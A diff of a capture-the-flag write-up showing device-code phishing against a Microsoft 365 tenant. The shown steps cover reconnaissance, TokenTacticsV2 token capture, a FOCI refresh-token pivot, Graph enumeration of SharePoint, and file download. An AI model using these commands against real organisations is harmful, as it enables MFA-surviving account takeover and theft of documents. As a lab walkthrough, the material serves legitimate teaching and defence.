@@ -16,7 +16,7 @@
 4. [Step 2 — Requesting a device code](#4-step-2--requesting-a-device-code)
 5. [Step 3 — Delivering the lure](#5-step-3--delivering-the-lure)
 6. [Step 4 — Capturing the tokens](#6-step-4--capturing-the-tokens)
-7. [Step 5 — Inspecting what we stole](#7-step-5--inspecting-what-we-stole)
+7. [Step 5 — Inspecting what I stole](#7-step-5--inspecting-what-i-stole)
 8. [Step 6 — FOCI pivot to a Graph-capable client](#8-step-6--foci-pivot-to-a-graph-capable-client)
 9. [Step 7 — Enumerating Microsoft Graph](#9-step-7--enumerating-microsoft-graph)
 10. [Step 8 — Hunting SharePoint & OneDrive](#10-step-8--hunting-sharepoint--onedrive)
@@ -29,15 +29,15 @@
 
 ## 1. The scenario
 
-The challenge drops us into the position of an external attacker targeting a Microsoft 365
-tenant. We have:
+The challenge drops me into the position of an external attacker targeting a Microsoft 365
+tenant. I have:
 
-- The name of a target organisation and one valid-looking **user email** (our phishing target).
+- The name of a target organisation and one valid-looking **user email** (my phishing target).
 - **No password, no MFA device, no network foothold.**
 
 The goal: reach a sensitive document stored in the tenant's SharePoint/OneDrive and read the
 flag inside it. Classically you would phish credentials — but the tenant enforces **MFA**, so a
-stolen password alone is useless. We need a technique that survives MFA. That technique is
+stolen password alone is useless. I need a technique that survives MFA. That technique is
 **device-code phishing**.
 
 ---
@@ -68,7 +68,7 @@ Key properties that make this devastating:
 
 ## 3. Step 1 — Reconnaissance
 
-First we confirm the target tenant exists and learn its tenant ID and authentication realm. This
+First I confirm the target tenant exists and learn its tenant ID and authentication realm. This
 is all unauthenticated, public metadata.
 
 ```bash
@@ -91,13 +91,13 @@ curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=<victim>@<targ
 ```
 
 A `NameSpaceType` of `Managed` confirms authentication happens at Entra ID itself (not an on-prem
-ADFS), which is what we want for a clean device-code flow.
+ADFS), which is what I want for a clean device-code flow.
 
 ---
 
 ## 4. Step 2 — Requesting a device code
 
-We use **TokenTacticsV2** to drive the flow. The classic abuse uses the well-known
+I use **TokenTacticsV2** to drive the flow. The classic abuse uses the well-known
 **Microsoft Office** first-party client ID (`d3590ed6-52b3-4102-aeff-aad2292ab01c`) because it is
 a **FOCI** client — its refresh token can later be rotated to other Microsoft apps.
 
@@ -109,7 +109,7 @@ Import-Module .\TokenTacticsV2.psd1
 Get-AzureToken -Client MSGraph -Device
 ```
 
-TokenTacticsV2 hits the `/devicecode` endpoint and prints the instruction we need to relay to the
+TokenTacticsV2 hits the `/devicecode` endpoint and prints the instruction I need to relay to the
 victim, then begins polling `/token`:
 
 ```text
@@ -129,7 +129,7 @@ victim, then begins polling `/token`:
 > ```
 > Note `offline_access` — that's what makes Entra ID return a **refresh token**, not just an access token.
 
-The clock is now running: we have ~15 minutes to get the victim to enter `K7QF-9XMP`.
+The clock is now running: I have ~15 minutes to get the victim to enter `K7QF-9XMP`.
 
 ---
 
@@ -146,7 +146,7 @@ is unusually convincing. A typical pretext:
 The victim:
 
 1. Opens the **real** Microsoft device-login page.
-2. Enters our code.
+2. Enters my code.
 3. Signs in with their **real** password and approves the **real** MFA prompt.
 4. Sees a generic "you're signed in" confirmation and closes the tab.
 
@@ -156,7 +156,7 @@ From their side, nothing looks wrong — every page was authentic Microsoft.
 
 ## 6. Step 4 — Capturing the tokens
 
-The instant the victim finishes, our polling loop receives `200 OK` from `/token` and
+The instant the victim finishes, my polling loop receives `200 OK` from `/token` and
 TokenTacticsV2 stores the bundle:
 
 ```text
@@ -170,7 +170,7 @@ TokenTacticsV2 stores the bundle:
 ```
 
 The tokens are held in the `$response` global. The **refresh token** is the crown jewel — even
-after the access token expires we can mint fresh ones without ever contacting the victim again.
+after the access token expires I can mint fresh ones without ever contacting the victim again.
 
 ```powershell
 # Persist for later use
@@ -179,9 +179,9 @@ $response | ConvertTo-Json -Depth 5 | Out-File .\victim_tokens.json
 
 ---
 
-## 7. Step 5 — Inspecting what we stole
+## 7. Step 5 — Inspecting what I stole
 
-Before acting, we decode the access token to confirm *who* we are and *what* we can do. Paste the
+Before acting, I decode the access token to confirm *who* I am and *what* I can do. Paste the
 JWT into [jwt.ms](https://jwt.ms), or decode locally:
 
 ```powershell
@@ -209,7 +209,7 @@ enough to find the flag.
 
 ## 8. Step 6 — FOCI pivot to a Graph-capable client
 
-Sometimes the initially captured token isn't scoped exactly how we need it, or we want to move to
+Sometimes the initially captured token isn't scoped exactly how I need it, or I want to move to
 a client with broader resource access. This is where **FOCI (Family of Client IDs)** comes in: a
 family of Microsoft first-party apps share refresh tokens, so a refresh token issued to one can be
 **redeemed for an access token to another** — no re-authentication.
@@ -222,7 +222,7 @@ $graph = Invoke-RefreshToMSGraphToken -RefreshToken $response.refresh_token `
 $graphAccess = $graph.access_token
 ```
 
-We now hold a Graph-ready access token for the victim, derived purely from the stolen refresh
+I now hold a Graph-ready access token for the victim, derived purely from the stolen refresh
 token. This is the same primitive attackers use for stealthy persistence and lateral movement.
 
 ---
@@ -250,13 +250,13 @@ curl -s -H "Authorization: Bearer $TOKEN" \
 The site search returns the tenant's SharePoint sites. One immediately stands out — a site whose
 name hints at restricted content (e.g. *"Finance"*, *"HR-Confidential"*, *"Secrets"*). That
 misconfiguration — a sensitive site the victim shouldn't be able to read but can — is the second
-flaw the challenge wants us to exploit.
+flaw the challenge wants me to exploit.
 
 ---
 
 ## 10. Step 8 — Hunting SharePoint & OneDrive
 
-We drill into the interesting site's default document library and list its contents:
+I drill into the interesting site's default document library and list its contents:
 
 ```bash
 SITE_ID="<id from the site search>"
@@ -290,7 +290,7 @@ This surfaces the target document — for this challenge, a file such as `flag.t
 ## 11. Step 9 — Exfiltrating the flag
 
 Every file item returned by Graph carries a pre-authenticated, short-lived
-`@microsoft.graph.downloadUrl`. We pull the content straight down:
+`@microsoft.graph.downloadUrl`. I pull the content straight down:
 
 ```bash
 ITEM_ID="<id of the flag file>"
@@ -310,8 +310,8 @@ Reading the file reveals the flag:
 flag{██████████████████████████████}
 ```
 
-> 🚩 **Replace the redaction above with the actual flag string you captured.** It's left masked
-> here so the repository can stay public without spoiling the challenge for others.
+> 🚩 The flag is intentionally masked here so this public write-up does not spoil the
+> challenge for others.
 
 **Challenge solved.** From one phished user code to full document exfiltration — without a
 password crack, without malware, and over Microsoft's own APIs the whole way.
